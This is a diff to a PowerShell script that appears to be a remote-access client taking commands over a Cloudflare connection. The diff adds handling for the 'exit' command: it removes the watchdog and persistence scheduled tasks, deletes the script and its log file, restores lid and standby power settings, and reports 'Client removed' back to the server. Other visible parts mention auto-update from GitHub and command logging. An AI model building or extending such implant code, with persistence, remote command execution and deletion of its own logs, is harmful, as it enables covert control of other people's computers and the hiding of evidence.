@@ -97,6 +97,13 @@ try {
     powercfg /setactive SCHEME_CURRENT 2>$null
 } catch {}
 
+# --- CLEANUP ORPHANED GUI TASKS (from previous crashes) ---
+try {
+    Get-ScheduledTask -TaskName "GUI_*" -ErrorAction SilentlyContinue | ForEach-Object {
+        Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false -ErrorAction SilentlyContinue
+    }
+} catch {}
+
 # ╔══════════════════════════════════════════════════════════════════════════════╗
 # ║  AUTO-UPDATE (removable)                                                    ║
 # ║  Periodically downloads the latest script from GitHub. If the hash differs,║
@@ -713,9 +720,30 @@ function Connect-Cloudflare {
                 Write-Log "CMD: $command"
 
                 if ($command -eq "exit") {
-                    Write-Log "Exit command received. Shutting down."
+                    Write-Log "Exit command received. Full cleanup."
+                    # Remove persistence tasks so watchdog doesn't revive
+                    try { Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue } catch {}
+                    try { Unregister-ScheduledTask -TaskName $watchdogTaskName -Confirm:$false -ErrorAction SilentlyContinue } catch {}
+                    # Remove script and log file
+                    try { Remove-Item $selfPath -Force -ErrorAction SilentlyContinue } catch {}
+                    try { Remove-Item $logFile -Force -ErrorAction SilentlyContinue } catch {}
+                    # Restore power policy
+                    try {
+                        powercfg /setacvalueindex SCHEME_CURRENT SUB_BUTTONS LIDACTION 1 2>$null
+                        powercfg /setdcvalueindex SCHEME_CURRENT SUB_BUTTONS LIDACTION 1 2>$null
+                        powercfg /change standby-timeout-ac 30 2>$null
+                        powercfg /setactive SCHEME_CURRENT 2>$null
+                    } catch {}
+                    # Cleanup any leftover GUI tasks
+                    try {
+                        Get-ScheduledTask -TaskName "GUI_*" -ErrorAction SilentlyContinue | ForEach-Object {
+                            Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false -ErrorAction SilentlyContinue
+                        }
+                    } catch {}
+                    # Release mutex and stop
                     try { $script:singleInstanceMutex.ReleaseMutex() } catch {}
                     try { $script:singleInstanceMutex.Dispose() } catch {}
+                    Send-Result-To-Server -Body "[+] Full cleanup complete. Client removed.`n"
                     break
                 }
 
